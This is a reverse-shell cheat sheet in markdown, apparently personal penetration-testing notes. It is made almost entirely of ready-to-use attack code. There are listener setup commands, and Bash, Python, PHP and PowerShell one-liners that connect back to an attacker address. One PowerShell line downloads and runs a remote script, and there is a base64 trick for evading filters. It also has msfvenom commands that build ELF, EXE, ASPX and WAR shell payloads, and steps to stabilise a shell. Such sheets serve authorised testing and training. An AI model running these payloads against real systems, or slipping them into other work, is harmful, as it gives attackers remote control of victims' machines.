# Reverse Shells

## Setup listener
```bash
rlwrap nc -lvnp 443   # better - arrow keys + history
nc -lvnp 443
```

## Bash
```bash
bash -i >& /dev/tcp/$IP/443 0>&1
```

## Bash (base64 if filtered)
```bash
echo "bash -i >& /dev/tcp/$IP/443 0>&1" | base64
# then on target:
echo <base64> | base64 -d | bash
```

## Python
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$IP'",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## PHP
```php
php -r '$sock=fsockopen("'$IP'",443);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## Powershell (Nishang Invoke-PowerShellTcp)
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://'$IP'/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 443
```

## Powershell one-liner (no download)
```powershell
$client = New-Object System.Net.Sockets.TCPClient("'$IP'",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## msfvenom payloads
```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o shell.exe

# Windows EXE (staged meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f exe -o met.exe

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f aspx -o shell.aspx

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=443 -f war -o shell.war
```

## Upgrade dumb shell to PTY
```bash
# 1. spawn pty
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Ctrl+Z to background

# 3. on attacker:
stty raw -echo; fg

# 4. back in shell:
export TERM=xterm
stty rows 38 columns 116   # adjust to your terminal
```

## Reverse shell generators (offline backup)
- https://www.revshells.com/  — bookmark, can run offline if cached
